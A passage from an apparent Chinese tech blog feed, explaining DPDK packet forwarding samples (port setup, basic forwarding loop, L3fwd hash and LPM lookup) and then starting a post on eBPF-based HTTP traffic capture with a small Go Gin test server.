class="title">rte_eth_tx_queue_setup</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> tx_queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">uint16_t</span> nb_tx_desc, <span class="keyword">unsigned</span> <span class="keyword">int</span> socket_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">const</span> struct rte_eth_txconf *tx_conf)</span></span></span><br></pre></td></tr></table></figure><p>网口设置：初始化配置结束后，启动端口<code>int rte_eth_dev_start(uint8_t port_id)；</code>完成后，读取 MAC 地址，打开网卡的混杂模式设置，允许所有报文进入。</p><p><code>port_init</code>处理逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Main functional part of port initialization. 8&lt; */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span><br><span class="line">port_init(<span class="keyword">uint16_t</span> port, struct rte_mempool *mbuf_pool)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_eth_conf</span> <span class="title">port_conf</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> rx_rings = <span class="number">1</span>, tx_rings = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> nb_rxd = RX_RING_SIZE;</span><br><span class="line"><span class="keyword">uint16_t</span> nb_txd = TX_RING_SIZE;</span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"><span class="keyword">uint16_t</span> q;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_eth_dev_info</span> <span class="title">dev_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_eth_txconf</span> <span class="title">txconf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!rte_eth_dev_is_valid_port(port))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;port_conf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct rte_eth_conf));</span><br><span class="line"></span><br><span class="line">retval = rte_eth_dev_info_get(port, &amp;dev_info);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Error during getting device (port %u) info: %s\n"</span>,</span><br><span class="line">port, strerror(-retval));</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dev_info.tx_offload_capa &amp; RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE)</span><br><span class="line">port_conf.txmode.offloads |=</span><br><span class="line">RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Configure the Ethernet device. */</span></span><br><span class="line">retval = rte_eth_dev_configure(port, rx_rings, tx_rings, &amp;port_conf);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">retval = rte_eth_dev_adjust_nb_rx_tx_desc(port, &amp;nb_rxd, &amp;nb_txd);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate and set up 1 RX queue per Ethernet port. */</span></span><br><span class="line"><span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; rx_rings; q++) &#123;</span><br><span class="line">retval = rte_eth_rx_queue_setup(port, q, nb_rxd,</span><br><span class="line">rte_eth_dev_socket_id(port), <span class="literal">NULL</span>, mbuf_pool);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">txconf = dev_info.default_txconf;</span><br><span class="line">txconf.offloads = port_conf.txmode.offloads;</span><br><span class="line"><span class="comment">/* Allocate and set up 1 TX queue per Ethernet port. */</span></span><br><span class="line"><span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; tx_rings; q++) &#123;</span><br><span class="line">retval = rte_eth_tx_queue_setup(port, q, nb_txd,</span><br><span class="line">rte_eth_dev_socket_id(port), &amp;txconf);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Starting Ethernet port. 8&lt; */</span></span><br><span class="line">retval = rte_eth_dev_start(port);</span><br><span class="line"><span class="comment">/* &gt;8 End of starting of ethernet port. */</span></span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Display the port MAC address. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_ether_addr</span> <span class="title">addr</span>;</span></span><br><span class="line">retval = rte_eth_macaddr_get(port, &amp;addr);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Port %u MAC: %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8</span><br><span class="line">   <span class="string">" %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8 <span class="string">"\n"</span>,</span><br><span class="line">port, RTE_ETHER_ADDR_BYTES(&amp;addr));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Enable RX in promiscuous mode for the Ethernet device. */</span></span><br><span class="line">retval = rte_eth_promiscuous_enable(port);</span><br><span class="line"><span class="comment">/* End of setting RX port in promiscuous mode. */</span></span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网口收发报文循环收发在<code>lcore_main</code>中实现，为保证性能，首先检测CPU与网卡的Socket是否最优适配。数据收发循环非常简单，为高速报文进出定义了burst的收发函数如下，四个参数意义非常直观：端口、队列、报文缓冲区以及收发包数。</p><p>基于端口队列的报文收发函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint16_t</span> <span class="title">rte_eth_rx_burst</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params">struct rte_mbuf **rx_pkts, <span class="keyword">const</span> <span class="keyword">uint16_t</span> nb_pkts)</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint16_t</span> <span class="title">rte_eth_tx_burst</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params">struct rte_mbuf **tx_pkts, <span class="keyword">uint16_t</span> nb_pkts)</span></span></span><br></pre></td></tr></table></figure><p>这就构成了最基本的DPDK报文收发展示。可以看到，此处不涉及任何具体网卡形态，软件接口对硬件没有依赖。</p><p><code>lcore_main</code>处理逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Basic forwarding application lcore. 8&lt; */</span></span><br><span class="line"><span class="keyword">static</span> __rte_noreturn <span class="keyword">void</span></span><br><span class="line">lcore_main(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint16_t</span> port;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check that the port is on the same NUMA node as the polling thread</span></span><br><span class="line"><span class="comment"> * for best performance.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">RTE_ETH_FOREACH_DEV(port)</span><br><span class="line"><span class="keyword">if</span> (rte_eth_dev_socket_id(port) &gt;= <span class="number">0</span> &amp;&amp;</span><br><span class="line">rte_eth_dev_socket_id(port) !=</span><br><span class="line">(<span class="keyword">int</span>)rte_socket_id())</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"WARNING, port %u is on remote NUMA node to "</span></span><br><span class="line"><span class="string">"polling thread.\n\tPerformance will "</span></span><br><span class="line"><span class="string">"not be optimal.\n"</span>, port);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nCore %u forwarding packets. [Ctrl+C to quit]\n"</span>,</span><br><span class="line">rte_lcore_id());</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Main work of application loop. 8&lt; */</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Receive packets on a port and forward them on the paired</span></span><br><span class="line"><span class="comment"> * port. The mapping is 0 -&gt; 1, 1 -&gt; 0, 2 -&gt; 3, 3 -&gt; 2, etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">RTE_ETH_FOREACH_DEV(port) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get burst of RX packets, from first port of pair. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_mbuf</span> *<span class="title">bufs</span>[<span class="title">BURST_SIZE</span>];</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> nb_rx = rte_eth_rx_burst(port, <span class="number">0</span>,</span><br><span class="line">bufs, BURST_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(nb_rx == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Send burst of TX packets, to second port of pair. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> nb_tx = rte_eth_tx_burst(port ^ <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">bufs, nb_rx);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Free any unsent packets. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(nb_tx &lt; nb_rx)) &#123;</span><br><span class="line"><span class="keyword">uint16_t</span> buf;</span><br><span class="line"><span class="keyword">for</span> (buf = nb_tx; buf &lt; nb_rx; buf++)</span><br><span class="line">rte_pktmbuf_free(bufs[buf]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &gt;8 End of loop. */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="L3fwd"><a href="#L3fwd" class="headerlink" title="L3fwd"></a>L3fwd</h5><p>L3fwd是发布DPDK性能测试的例子。如果将PCIE插槽上填满高速网卡，将网口与大流量测试仪表连接，他能展示在双路服务器平台具备<code>200Gbit/s</code>的转发能力。数据包被收入系统后，会查询IP报文头部，依据目标地址进行路由查找，发现目的端口，修改IP头部后，将报文从目的端口送出。路由查找有两种方式，一种是基于目标IP地址的完全匹配(<code>exact match</code>)，另一种是基于路由表的最长掩码匹配(<code>Longest Prefix Match,LPM</code>)。</p><p>启动这个例子，指定命令参数格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build/l3fwd [EAL options] -- -p PORTMASK [-P] --config(port,queue,lcore) [,(port,queue,lcore)]</span><br></pre></td></tr></table></figure><p>命令参数分为两个部分，以”—“为分界线，分界线右边的参数是三层转发的私有命令选项。左边是DPDK的<code>EAL Options</code></p><ul><li>[EAL Options]是DPDK运行环境的输入配置选项，输入命令会交给<code>rte_eal_init</code>处理</li><li>PORTMASK依据掩码选择端口，DPDK启动时会搜索系统认识的PCIe设备，依据黑白名单原则来决定是否接管，早期版本可能会接管所有端口，断开网络连接。现在可通过脚本绑定。</li><li>config选项指定(port,queue,lcore)，用指定线程处理对应的端口的队列。要实现<code>200Gbit/s</code>的转发，需要大量线程(核)参与，并行转发。</li></ul><p>主线程<code>main</code>的处理流程如下所述：</p><ul><li>初始化运行环境：<code>rte_eal_init(argc,argv)</code></li><li>分析入参：<code>parse_args(argc,argv)</code></li><li>初始化lcore与port配置</li><li>端口与队列初始化</li><li>端口启动，使能混杂模式</li><li>启动从线程，令其运行<code>main_loop()</code></li></ul><p>从线程执行<code>main_loop()</code>的处理流程如下所述：</p><ul><li>读取自己的lcore信息完成配置</li><li>读取关联的接收与发送队列信息</li><li>进行循环处理：<ul><li>向指定队列批量发送报文</li><li>从指定队列批量接收报文</li><li>批量转发接收到的报文</li></ul></li></ul><p>批量转发接收到的报文是处理的主体，提供了基于Hash的完全匹配转发，也可以基于LPM进行转发。转发路由查找方式可以由编译配置选择。</p><p>下面的例子包括基于<code>multi buffer</code>原理的代码实现，在<code>#if(ENABLE_MULTI_BUFFER_OPTIMIZE == 1)</code>的路径下，一次处理8个报文。它的实现有效利用了处理器内部的乱序执行和并行处理能力，能显著提高转发性能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j += <span class="number">8</span>) &#123;</span><br><span class="line">     <span class="keyword">uint32_t</span> pkt_type =</span><br><span class="line">     pkts_burst[j]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">1</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">2</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">3</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">4</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">5</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">6</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">7</span>]-&gt;packet_type;</span><br><span class="line"> <span class="keyword">if</span> (pkt_type &amp; RTE_PTYPE_L3_IPV4) &#123;</span><br><span class="line"> simple_ipv4_fwd_8pkts(&amp;pkts_burst[j], portid, qconf);</span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pkt_type &amp; RTE_PTYPE_L3_IPV6) &#123;</span><br><span class="line"> simple_ipv6_fwd_8pkts(&amp;pkts_burst[j], portid, qconf);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">1</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">2</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">3</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">4</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">5</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">6</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">7</span>],portid, qconf);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> (; j &lt; nb_rx ; j++) &#123;</span><br><span class="line"> l3fwd_simple_forward(pkts_burst[j],portid, qconf);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>依据IP头部的五元组信息，利用<code>rte_hash_lookup</code>来查询目标端口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mask0 = _mm_set_epi32(ALL_32_BITS, ALL_32_BITS, ALL_32_BITS, BIT_8_TO_15);</span><br><span class="line">ipv4_hdr = (<span class="keyword">uint8_t</span> *)ipv4_hdr + offsetof(struct ipv4_hdr, time_to_live);</span><br><span class="line">__m128i data = _mm_loadu_si128((__m128i*)(ipv4_hdr));</span><br><span class="line"><span class="comment">/* Get 5 tuple: dst port, src port, dst IP address, src IP address and protocol */</span></span><br><span class="line">key.xmm = _mm_and_si128(data, mask0);</span><br><span class="line"><span class="comment">/* Find destination port */</span></span><br><span class="line">ret = rte_hash_lookup(ipv4_l3fwd_lookup_struct, (<span class="keyword">const</span> <span class="keyword">void</span> *)&amp;key);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">uint8_t</span>)((ret &lt; <span class="number">0</span>)? portid : ipv4_l3fwd_out_if[ret]);</span><br></pre></td></tr></table></figure><p>这段代码在读取报文头部信息时，将整个头部导入了基于SSE的矢量寄存器(128位宽)，并对内部进行了掩码mask0运算，得到key，然后把key作为入口参数送入<code>rte_hash_lookup</code>运算。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>DPDK立足通用多核处理器，经过软件优化的不断摸索，实践出一套行之有效的方法，在IA数据包处理上取得重大性能突破。随着软硬件解耦的趋势，DPDK已经成为NFV事实上的数据面基石。着眼未来，无论是网络节点，还是计算节点或是存储节点，这些云服务的基础设施都有机会因DPDK而得到加速。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;什么是DPDK？对于用户，是性能出色的报数据处理加速软件库；对于开发者，是一个实践包处理新想法的创新工场；对于性能调优者，是一个绝佳的成果分
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>eBPF流量捕获实践</title>
    <link href="elssm.github.io/2022/10/05/eBPF%E6%B5%81%E9%87%8F%E6%8D%95%E8%8E%B7%E5%AE%9E%E8%B7%B5/"/>
    <id>elssm.github.io/2022/10/05/eBPF流量捕获实践/</id>
    <published>2022-10-05T03:23:09.000Z</published>
    <updated>2022-10-05T03:27:48.155Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>就目前而言，tcpdump是捕获生产中流量最常见的解决方案之一。但是缺点是它不允许应用程序级别的过滤(L7过滤)，因此每当捕获相关的HTTP会话时，最终需要存储数百兆字节的流量通过。另一种解决方案是在源代码中添加一个算法来查找相关的HTTP会话，但这需要在生产中进行代码检测，并且无法达到非侵入式可观测性。</p><p>eBPF应运而生。eBPF是Linux应用程序在Linux内核空间执行代码的一种机制。使用eBPF实现流量捕获远远超出一些标准的解决方案(WireShark、Fiddler和tcpdump)</p><p>eBPF允许添加多个过滤层并直接从内核捕获流量，从而显著减少相关数据的输出量，并确保可以高吞吐量的处理应用程序流量。</p><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><ul><li>Ubuntu20.04</li><li>BCC v0.21.0 </li><li>GO v1.19</li></ul><h4 id="请求流程分析"><a href="#请求流程分析" class="headerlink" title="请求流程分析"></a>请求流程分析</h4><p>首先通过GO的Gin框架搭建一个简单的HTTP服务器。源码如下</p><p><code>server.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"math/rand"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">defaultPort    = <span class="string">"8080"</span></span><br><span class="line">maxPayloadSize = <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span> <span class="comment">// 10 MB</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line"><span class="comment">// source is a static, global rand object.</span></span><br><span class="line">source      *rand.Rand</span><br><span class="line">letterBytes = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">randStringBytes</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">b := <span class="built_in">make</span>([]<span class="keyword">byte</span>, n)</span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> b &#123;</span><br><span class="line">b[i] = letterBytes[source.Intn(<span class="built_in">len</span>(letterBytes))]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">string</span>(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">source = rand.New(rand.NewSource(time.Now().UnixNano()))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// customResponse holds the requested size for the response payload.</span></span><br><span class="line"><span class="keyword">type</span> customResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">Size <span class="keyword">int</span> <span class="string">`json:"size"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">postCustomResponse</span><span class="params">(context *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> customResp customResponse</span><br><span class="line"><span class="keyword">if</span> err := context.BindJSON(&amp;customResp); err != <span class="literal">nil</span> &#123;</span><br><span class="line">_ = context.AbortWithError(http.StatusBadRequest, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> customResp.Size &gt; maxPayloadSize &#123;</span><br><span class="line">_ = context.AbortWithError(http.StatusBadRequest, fmt.Errorf(<span class="string">"requested size %d is bigger than max allowed %d"</span>, customResp, maxPayloadSize))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">context.JSON(http.StatusOK, <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;<span class="string">"answer"</span>: randStringBytes(customResp.Size)&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">engine := gin.New()</span><br><span class="line"></span><br><span class="line">engine.Use(gin.Recovery())</span><br><span class="line">engine.POST(<span class="string">"/customResponse"</span>, postCustomResponse)</span><br><span class="line"></span><br><span class="line">port := os.Getenv(<span class="string">"PORT"</span>)</span><br><span class="line"><span class="keyword">if</span> port == <span class="string">""</span> &#123;</span><br><span class="line">port = defaultPort</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"listening on 0.0.0.0:%s\n"</span>, port)</span><br><span class="line"><span class="keyword">if</span> err := engine.Run(fmt.Sprintf(<span class="string">"0.0.0.0:%s"</span>, port)); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/eBPF-Sniffer# go run server.go</span><br><span class="line">server.go:11:2: no required module provides package github.com/gin-gonic/gin; to add it:</span><br><span class="line">go get github.com/gin-gonic/gin</span><br></pre></td></tr></table></figure><p>如上因为没有安装gin框架，因此我们先安装gin框架。修改代理后使用<code>go get</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export 